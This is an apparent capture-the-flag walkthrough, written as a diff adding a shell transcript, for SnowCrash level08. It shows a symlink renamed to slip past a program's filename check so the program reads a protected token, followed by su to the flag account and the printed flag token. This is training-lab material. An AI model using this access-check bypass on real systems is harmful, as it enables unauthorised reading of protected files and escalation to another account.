@@ -1,0 +1,18 @@
+<> [...]
+< level08@SnowCrash:~$ ln -s ~/token /tmp/token
+< level08@SnowCrash:~$ ./level08 /tmp/token
+> You may not access '/tmp/token'
+< level08@SnowCrash:~$ ./level08 /tmp/aaa
+> level08: Unable to open /tmp/aaa: No such file or directory
+< level08@SnowCrash:~$ rm /tmp/token
+< level08@SnowCrash:~$ ln -s ~/token /tmp/aaa
+< level08@SnowCrash:~$ ./level08 /tmp/aaa
+> quif5eloekouj29ke0vouxean
+< level08@SnowCrash:~$ su level09
+< Password:
+> su: Authentication failure
+< level08@SnowCrash:~$ su flag08
+< Password:
+> Don't forget to launch getflag !
+< flag08@SnowCrash:~$ getflag
+> Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
